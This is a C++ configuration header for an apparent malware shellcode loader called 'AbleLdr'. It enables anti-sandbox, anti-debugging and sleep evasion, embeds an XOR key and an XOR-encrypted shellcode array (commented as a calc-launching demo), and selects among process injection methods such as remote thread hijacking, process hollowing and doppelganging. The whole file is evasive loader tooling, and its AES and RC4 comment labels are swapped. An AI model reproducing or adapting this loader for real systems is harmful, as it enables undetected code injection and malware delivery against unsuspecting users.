#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK 1

// Anti Sandbox
#define ANTI_SANDBOX_ENABLED 1
#define SLEEP_ENABLED 1

#define SLEEP_METHOD 1
#define SLEEP_TIME 5000
#if SLEEP_METHOD == 1
#define SleepMethod(sleep_time) malapi::SleepMs(sleep_time)
#endif

// Anti Debugging
#define ANTI_DEBUG_ENABLED 1

#define DEBUG_IS_BEING_DEBUGGED 1
#define DEBUG_REMOTE_DEBUGGING 1

// Encryption

//unsigned char key[] = { {{ENCRYPT_KEY}} };

unsigned char key[] = {
	0x12,0x34,0x46,0x34,0x34,0x12,0x23,0x53,0x24,0x56,0x32
}; // shellcrypt.py -i shellcode.bin -e xor -k 141414 -f c

#define CONFIG_ENCRYPT_IV "AbleKey"

//#define CONFIG_ENCRYPTION_METHOD {{ }}

#define CONFIG_ENCRYPTION_METHOD 2
#if CONFIG_ENCRYPTION_METHOD == 1
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::NONE(shellcode, sizeof(shellcode), key, key_len) // No Encryption
#elif CONFIG_ENCRYPTION_METHOD == 2
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::XOR(shellcode, sizeof(shellcode), key, key_len) // XOR Encrypt
#elif CONFIG_ENCRYPTION_METHOD == 3
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::AES(shellcode, sizeof(shellcode), key, key_len) // RC4 Encrypt
#elif CONFIG_ENCRYPTION_METHOD == 4
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::RC4(shellcode, sizeof(shellcode), key, key_len) // AES Encrypt
#endif

// Obfuscation
#define CONFIG_OBFUSCATION_METHOD 1

// Payloads
//unsigned char shellcode[] = { {{SHELLCODE}} };
unsigned char shellcode[] = {
		0x42,0x05,0x86,0x74,0xa6,0x66,0x6d,0x33,0x6e,0x04,0x5a,0x71,0x55,0x2a,0x57,
		0x60,0x4b,0x71,0x02,0x40,0xdd,0x40,0x22,0xbf,0x30,0x38,0xbf,0x64,0x2f,0xfe,
		0xaf,0x66,0xb9,0x6c,0x2c,0xcd,0x6b,0x08,0x99,0x7f,0x4c,0x5c,0xdd,0x46,0x0d,
		0x14,0x47,0xca,0xbf,0x46,0x3c,0x77,0x2b,0xe1,0x1e,0x05,0x76,0x04,0x99,0xb5,
		0x2e,0x24,0x04,0x4d,0x38,0x77,0x67,0xc4,0xcd,0x40,0x2b,0x0e,0x22,0xad,0x27,
		0x6a,0x9c,0xed,0xe3,0x1e,0x6c,0x55,0x80,0x7b,0x90,0x74,0x07,0x61,0x44,0x63,
		0x13,0x64,0x86,0x72,0x4b,0x30,0x45,0x3a,0x51,0x46,0x6d,0x0e,0x1d,0xe0,0x77,
		0x6b,0xd8,0x16,0x1e,0xb9,0x64,0x2c,0x0e,0xbf,0x42,0x02,0x6b,0xfe,0x6c,0xdd,
		0x02,0x5a,0xbf,0x38,0x04,0x37,0x45,0x1f,0xd8,0x78,0x41,0x1a,0x99,0x40,0x59,
		0x14,0x7c,0x13,0xdd,0xd8,0x70,0x49,0x16,0x1d,0x83,0x6a,0x23,0xb9,0x40,0x21,
		0xfe,0xa5,0x6a,0x35,0x45,0x5d,0x28,0x71,0x41,0xfd,0xa8,0x27,0x3b,0x4a,0x7a,
		0x13,0xca,0xcd,0x00,0x9a,0x5a,0x22,0xa4,0xbd,0xa9,0xe5,0x5a,0xb7,0x82,0x44,
		0x69,0x4d,0x7d,0x08,0x7d,0x0c,0x6a,0xd1
}; // win-calc shellcode w xor encryption

// Targets List

// Execution Methods
#define CONFIG_EXECUTION_METHOD 2
#define CONFIG_CREATE_PROCESS 1

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::CreateRemoteThreadInjection(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::RemoteHijack(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 3
#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 4
#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::Hollowing(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 5
#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::Doppleganger(phandle, shellcode, shellcode_len)
#endif

#endif
